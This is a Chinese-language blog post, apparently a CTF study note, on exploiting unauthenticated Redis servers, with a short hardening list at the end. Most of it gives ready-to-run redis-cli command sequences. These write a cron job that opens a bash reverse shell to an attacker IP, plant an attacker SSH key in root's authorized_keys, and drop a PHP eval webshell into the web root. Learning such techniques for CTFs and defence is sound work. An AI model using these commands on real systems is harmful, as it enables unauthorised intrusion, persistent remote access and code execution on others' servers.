# Redis 未授权访问



## 0x00 前言

刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法



## 0x01 Redis 介绍

Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库

Redis 通常将全部的数据存储在内存中，但也可以将数据持久化存储在硬盘中（数据持久化给了我们利用的机会）



## 0x02 环境搭建

安装 redis 后，在配置文件 `redis.conf` 中 `bind 127.0.0.1 ::1` 一行前加 `#` 将其注释，并将 `protected-mode` 设为 `no` ，然后启动 redis-server

然后在攻击机上输入 `redis-cli -h 目标IP` 命令连接目标机器的 redis-server，若连接成功则环境搭建完成



## 0x03 利用方法

### 1. 利用 Cron 定时任务反弹 shell

> 关于 Linux Cron 定时任务见另一篇博客 [[Linux Cron 定时任务](https://x5tar.com/2020/06/21/linux-crontab/)](https://x5tar.com/2020/06/21/linux-crontab/)
>
> **本方法适用于目标机器以 root 身份启动 Redis 的情况**

先在攻击机上监听任意端口 `nc -lvvp Port` 

然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令）

```
> set x "\n* * * * * bash -i >& /dev/tcp/攻击机IP/Port 0>&1\n"
OK
> config set dir /var/spool/cron/
OK
> config set dbfilename root
OK
> save
OK
```

稍等片刻即可在攻击机接收到回弹的 shell

若长时间未接收到，可尝试将第二行命令中的目录改为 `/var/spool/cron/crontabs` 再次尝试

### 2. 写入公钥并利用 ssh 连接

> **本方法适用于目标机器安装并启动了 ssh server 的情况**
>
> 使用本方法需要知道启动 redis 的用户的 home 目录

先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖）

```
ssh-keygen -t rsa
```

然后在 `~/.ssh` 目录下执行以下命令

```
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") | redis-cli -h 目标机器IP -x set x
```

然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 `/home`）

```
> config set dir /root/.ssh
OK
> config set dbfilename authorized_keys
OK
> save
OK
```

然后在攻击机通过 ssh 连接目标机器即可

### 3. 写入 webshell

> **本方法适用于 redis 用户权限较低但对 web 目录有写权限的情况**
>
> 使用本方法需要知道 web 目录的绝对路径

在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP）

```
> set x "\n<?php eval($_POST['cmd']); ?>\n"
OK
> config set dir /var/www/html
OK
> config set dbfilename evil.php
OK
> save
OK
```

然后连接 webshell 即可

### 4. 利用 lua 脚本进行操作

> 在其它地方看到的，但是在 Redis 里甚至连 IO 库和 OS 库都不能用，暂未发现可靠的利用方法

从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作

```
> eval "return 'hello'" 0
"hello"
```

### 5. 其它方法

既然通过 Redis 未授权访问获得了写入文件的权限，则可根据目标机器启动的服务，针对性的使用其它方法进行进一步渗透



## 0x04 安全配置

Redis 未授权访问危害较大，故根据以上利用方法，可针对性的进行以下配置，增强安全性

1. 仅绑定部分地址，限制可访问的 IP

2. 修改 Redis 监听端口

3. 为用户设置密码

4. 以单独的低权限用户启动 Redis，并禁止登录

5. 禁止使用或修改高危命令名称（rename-command）

   
